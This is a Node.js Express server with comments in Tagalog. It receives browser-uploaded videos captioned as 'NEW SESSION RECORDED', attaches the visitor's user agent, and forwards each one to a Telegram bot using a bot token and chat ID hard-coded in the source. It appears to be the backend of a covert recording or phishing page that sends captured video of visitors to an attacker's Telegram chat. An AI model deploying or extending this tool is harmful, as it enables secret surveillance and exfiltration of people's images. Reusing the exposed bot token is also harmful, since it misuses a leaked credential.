import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Kuhanin ang tamang path directory para sa Render environment
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ===== CONFIGURATION CONFIG =====
// Gagamit ng PORT mula sa Render environment, fallback sa 3000 kung local dev
const PORT = process.env.PORT || 3000; 
const BOT_TOKEN = "8879628969:AAF5g8XnFu9Ido-nKTHj8GAWBd0R-iA5bAA";
const CHAT_ID = "-1003979222265";

// Build clean Telegram text markdown with only necessary device info
function buildCaption(info) {
    return `🎬 *NEW SESSION RECORDED*

💻 *Device UserAgent:*
\`${info.userAgent || "Unknown"}\``;
}

// Serve frontend assets gamit ang absolute path resolution
app.use(express.static(path.join(__dirname, "frontend")));

// Upload endpoint
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) {
            return res.status(400).json({ error: "No video file provided" });
        }

        const { userAgent } = req.body;

        const captionText = buildCaption({ userAgent });

        // Initialize multi-part form data for Telegram API
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption", captionText);
        form.append("parse_mode", "Markdown");
        
        // Append video stream directly out of system RAM buffer
        form.append("video", videoFile.buffer, {
            filename: "video.mp4",
            contentType: videoFile.mimetype
        });

        // Dispatch payload to Telegram API sendVideo endpoint
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            {
                method: "POST",
                body: form,
                headers: form.getHeaders()
            }
        );

        const result = await telegramResponse.json();

        if (!result.ok) {
            console.error("Telegram API Error Response:", result);
            return res.status(502).json({ error: "Telegram API bad gateway execution", details: result });
        }

        console.log("Telegram transmission success:", result.result.message_id);
        res.json({ success: true, messageId: result.result.message_id });

    } catch (error) {
        console.error("Processing breakdown error:", error);
        res.status(500).json({
            error: "Server internal error",
            message: error.message
        });
    }
});

// Pwersahang i-serve ang index.html sa kahit anong hindi tugmang rota para maiwasan ang "Not Found"
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "frontend", "index.html"));
});

app.listen(PORT, () => {
    console.log(`Server executing active processes on port ${PORT}`);
});
